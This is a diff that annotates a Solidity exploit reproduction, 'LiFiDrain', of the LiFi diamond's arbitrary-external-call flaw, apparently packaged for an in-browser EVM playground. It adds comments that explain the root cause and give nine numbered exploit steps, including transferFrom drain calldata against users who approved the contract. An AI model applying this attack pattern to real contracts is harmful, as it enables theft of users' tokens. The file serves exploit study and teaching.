@@ -5,17 +5,43 @@
 // (test/LiFi_exp.sol) into a standalone, self-contained contract with a single run()
 // entrypoint, so the in-browser EVM Playground can deploy + record it. No imports.
 //
-// Vulnerability: LiFi's diamond swap facet (0x73a4...1fC8E) honours an attacker-
-// supplied SwapData[] of {callTo, approveTo, callData} with NO whitelist. The attacker
-// hides a real-looking USDT->USDC swap (leg 0) followed by 37 entries whose callTo is
-// an ERC20 token contract and whose callData is transferFrom(victim, receiver, amt).
-// Because the diamond is the spender (every prior LiFi user approved it), each
-// transferFrom invoked FROM the diamond drains the victim's tokens to the attacker.
-// The facet only checks the bridge asset balance at the end, so the 37 drains are
-// invisible to its gate. Profit is measured on the hardcoded receiver.
+// VULNERABILITY: Arbitrary External Call in Multi-Swap Pre-Bridge Logic (No CallTo Whitelist)
+// Root cause: LiFi diamond (LIFI=0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1) delegatecalls
+// into a swap facet that implements swapAndStartBridgeTokensViaCBridge(LiFiData, SwapData[], CBridgeData).
+// SwapData {callTo, approveTo, sendingAssetId, receivingAssetId, fromAmount, callData} is accepted with
+// zero validation that callTo is a DEX or that callData performs a swap.
+// Internal logic (per leg):
+//   if (sendingAssetId non-native && contract balance < fromAmount) transferFrom(sendingAssetId, msg.sender, this, fromAmount)
+//   approve(sendingAssetId, approveTo, fromAmount)
+//   callTo.call(callData)
+// After the array the facet only asserts that its balanceOf(receivingAssetId) >= bridge amount (here 40M USDC).
+// No per-leg delta accounting, no callTo whitelist.
+// Because users routinely approve routers for swaps, the diamond holds infinite allowances on many tokens.
+// When a drain leg does callTo=USDC.call( transferFrom(victim, RECEIVER, amt) ), the effective caller is LiFi,
+// so the allowance check passes and tokens are sent directly to the attacker-controlled receiver.
+// References: ILiFi.SwapData (lines 29-36), leg 0 (USDT->USDC via 0x, ~lines 71-78), legs 1-37 (transferFrom drains),
+// run() final call (line ~381).
+// Why works: zero-fromAmount legs are no-ops for pull/approve but still execute the .call; final gate only looks at one asset.
+// Impact: Theft of arbitrarily many tokens from every address that had ever approved the LiFi diamond. Direct loss to users;
+// bridge leg was largely irrelevant.
+//
+// EXPLOIT STEPS:
+// 1. Deploy/call LiFiDrain.run() (or the original testExploit).
+// 2. Build LiFiData with sending=USDT, receiving=USDC, receiver=attacker, amount=50M (but bridge only 40M).
+// 3. SwapData[0] = {callTo=0xDef1C0de..., approveTo=same, sending=USDT, fromAmount=50M, callData=0x d9627aa4... (0x sellToUniswap)}.
+// 4. For i=1..37: SwapData[i] = {callTo=<ERC20 token that approved LiFi>, approveTo=0, sending=0, fromAmount=0,
+//    callData=0x23b872dd + abi.encode(victim, RECEIVER, amt) }  -- transferFrom calldata.
+// 5. CBridgeData for 40M USDC to RECEIVER on Arbitrum.
+// 6. Invoke swapAndStartBridgeTokensViaCBridge; inside facet the 38 calls run in the diamond's context.
+// 7. Leg 0 succeeds and leaves USDC on diamond; legs 1-37 each perform a victim->attacker transferFrom using diamond's allowance.
+// 8. Diamond's post-swap check (balance[USDC] >= 40M) passes -> bridge is initiated (funds flow to receiver).
+// 9. Attacker receives both bridged USDC and the directly transferred tokens (the real profit).
 pragma solidity 0.8.10;
 
 interface ILiFi {
+    // VULNERABILITY INTERFACE: the SwapData struct is the attack vector surface.
+    // Every field (especially callTo + callData) is attacker-controlled with no sanitization
+    // by the callee implementation.
     struct LiFiData {
         bytes32 transactionId;
         string integrator;
@@ -382,6 +408,9 @@ contract LiFiDrain {
             maxSlippage: 255_921
         });
 
+        // VULNERABILITY MARK: the single external call site. All 38 attacker-controlled low-level calls
+        // (including 37 token.transferFrom drains) are performed with the diamond as msg.sender.
+        // The CBridgeData is only reached after the accounting gate that does not observe the drains.
         ILiFi(LIFI).swapAndStartBridgeTokensViaCBridge(_liFiData, _swapData, _cBridgeData);
     }
 }
